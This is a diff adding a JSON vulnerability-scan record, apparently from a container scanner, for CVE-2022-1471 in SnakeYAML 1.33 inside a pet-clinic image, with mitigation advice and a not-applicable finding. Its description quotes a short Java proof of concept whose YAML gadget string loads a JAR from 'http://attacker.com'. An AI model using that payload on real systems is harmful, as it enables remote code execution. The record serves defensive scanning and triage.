@@ -1,0 +1,114 @@
+[
+   {
+      "user_issue_id": "1710167152632950784",
+      "comp_id": "docker://pet-clinic:sha256:f695c8330214a71a7ac03d628473baf3213ecc08b8fb68468bb47b2e08c37324",
+      "component_package_type": "docker",
+      "comp_name": "pet-clinic:sha256",
+      "comp_version": "f695c8330214a71a7ac03d628473baf3213ecc08b8fb68468bb47b2e08c37324",
+      "type": "security",
+      "targets": null,
+      "issue_id": "XRAY-262821",
+      "paths": [
+         "default/ilay-docker-local/pet-clinic/sha256:f695c8330214a71a7ac03d628473baf3213ecc08b8fb68468bb47b2e08c37324/manifest.json"
+      ],
+      "watcher_id": "f4fe585eb751666306b7f7cd",
+      "watcher_name": "Security_watch_1",
+      "matched_policies": [
+         {
+            "policy": "Security_policy_1",
+            "rule": "Critical_CVEs",
+            "is_blocking": false,
+            "blocking_mask": 0
+         }
+      ],
+      "summary": "SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization.",
+      "severity": "Critical",
+      "updated": "2023-10-06T05:36:37Z",
+      "permissions": {},
+      "is_source_root": false,
+      "is_high_profile": true,
+      "high_profile_info": {
+         "Id": 0,
+         "PublicVulnsTblID": 0,
+         "VulnId": "XRAY-262821",
+         "VulnerabilityTitle": "",
+         "ShortDescription": "A design problem in SnakeYAML leads to remote code execution when deserializing untrusted YAML data.",
+         "FullDescription": "[SnakeYAML](https://bitbucket.org/snakeyaml/snakeyaml/) is a popular Java-based YAML parsing that provides a high-level API for serialization and deserialization of YAML documents.\n\nIt was discovered that a crafted YAML file containing a Java `Constructor` can lead to remote code execution due to deserialization.\n\nSnakeYaml's Constructor class, which inherits from SafeConstructor, allows any class type to be deserialized. A ConstructorException is thrown, but only after the malicious\npayload is deserialized.\n\nTo exploit this issue, an attacker must find remote input that propagates into the `Yaml.load()` method. \nThe attacker must deserialize a [Java \"gadget\" class](http://frohoff.github.io/owaspsd-deserialize-my-shorts/) that's available in the application's classpath in order to achieve code execution via the deserialization. However - there are gadget classes that are available by default such as the built-in `javax.script.ScriptEngineManager`.\n\nA remote code execution PoC example, using the Java built-in class `javax.script.ScriptEngineManager`:\n```\nString strYaml = \"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader \"\n                + \"[[!!java.net.URL [\\\"http://attacker.com\\\"]]]]\";;\nYaml yaml = new Yaml(new Constructor(Foo.class));\nyaml.load(strYaml);\n```\nThe PoC will run an arbitrary JAR file supplied from `http://attacker.com`. Note that even though `Constructor` receives a specific class type (`Foo.class`), any gadget class can be deserialized.\n\nNote that the vulnerability will not apply to applications that use the (non-default) `SafeConstructor`",
+         "Impact": 7,
+         "VulnerabilityType": "Remote code execution",
+         "Resolution": "##### Development mitigations\n\nUse the (non-default) `SafeConstructor` class to initialize the `Yaml` class -\n```\nLoaderOptions options = new LoaderOptions();\nYaml yaml = new Yaml(new SafeConstructor(options));\nString strYaml = Files.readString(Path.of(\"input_file\")); \nString parsed = yaml.load(strYaml);\n```\n\nNote that this class will only allow deserialization of [basic types](https://github.com/Thinkofname/snakeyaml/blob/master/src/main/java/org/yaml/snakeyaml/constructor/SafeConstructor.java#L52) such as Integers, Strings, Maps etc.",
+         "ExtendedImpactReasons": [
+            {
+               "Id": 0,
+               "PublicVulnsExtendedTblId": 0,
+               "Name": "The issue has an exploit published",
+               "Description": "PoC demonstrates remote code execution.",
+               "IsPositive": 0,
+               "InsertOrder": 4
+            },
+            {
+               "Id": 0,
+               "PublicVulnsExtendedTblId": 0,
+               "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
+               "Description": "An attacker must find remote input that propagates into the `Yaml.load()` method. The `Yaml` class must be initialized either with no arguments (default initialization) or with a `Constructor` instance. The vulnerability can still be exploited even if the `Constructor` instance is initialized with a specific class type.",
+               "IsPositive": 1,
+               "InsertOrder": 1
+            },
+            {
+               "Id": 0,
+               "PublicVulnsExtendedTblId": 0,
+               "Name": "The issue results in a severe impact (such as remote code execution)",
+               "Description": "Remote code execution.",
+               "IsPositive": 0,
+               "InsertOrder": 2
+            },
+            {
+               "Id": 0,
+               "PublicVulnsExtendedTblId": 0,
+               "Name": "The prerequisites for exploiting the issue are either extremely common or nonexistent (always exploitable)",
+               "Description": "It is highly likely that SnakeYAML will be used to parse externally-supplied YAML data. In addition, the vulnerability is exploitable when the `Yaml` class is initialized with default arguments.",
+               "IsPositive": 0,
+               "InsertOrder": 3
+            }
+         ],
+         "ExtendedReferences": [
+            {
+               "Id": 0,
+               "PublicVulnsExtendedTblId": 0,
+               "RefType": "Patch",
+               "Title": "Fixing commit",
+               "Url": "https://bitbucket.org/snakeyaml/snakeyaml/commits/2b8d47c8bcfd402e7a682b7b2674e8d0cb25e522",
+               "InsertOrder": 1
+            },
+            {
+               "Id": 0,
+               "PublicVulnsExtendedTblId": 0,
+               "RefType": "Advisory",
+               "Title": "GitHub Advisory",
+               "Url": "https://github.com/advisories/GHSA-mjmj-j48q-9wg2",
+               "InsertOrder": 2
+            }
+         ],
+         "ExtendedRelatedVulns": null
+      },
+      "cve_applicability_info": {
+         "scanner_available": true,
+         "component_id": "pet-clinic:sha256:f695c8330214a71a7ac03d628473baf3213ecc08b8fb68468bb47b2e08c37324",
+         "source_comp_id": "gav://org.yaml:snakeyaml:1.33",
+         "cve_id": "CVE-2022-1471",
+         "scan_status": 1,
+         "applicability": false,
+         "scanner_explanation": "<p>The scanner checks whether any of the vulnerable functions are called -</p>\n<ul>\n<li><code>Yaml.load</code></li>\n<li><code>Yaml.loadAll</code></li>\n<li><code>Load.loadFromString</code></li>\n<li><code>Load.loadAllFromString</code></li>\n<li><code>Load.loadFromInputStream</code></li>\n<li><code>Load.loadAllFromInputStream</code></li>\n<li><code>Load.loadFromReader</code></li>\n<li><code>Load.loadAllFromReader</code></li>\n</ul>\n<p>In addition, the scanner also checks whether a mitigation is used (initiating <code>Yaml</code> with a <code>SafeConstructor</code>).</p>",
+         "evidence": null,
+         "info": "The vulnerable function Load.load(All)FromString is never called with external input",
+         "details": null
+      },
+      "is_exposures_issue": false,
+      "source": "org.yaml:snakeyaml",
+      "source_version": "1.33",
+      "source_id": "gav://org.yaml:snakeyaml",
+      "component_physical_paths": [
+         "sha256__497fd4b1c7d012588a4bc27bc776c2556e82856c33b12bddec1bc0c95b3b5b61.tar.gz/spring-petclinic.jar/BOOT-INF/lib/snakeyaml-1.33.jar"
+      ]
+   }
+]
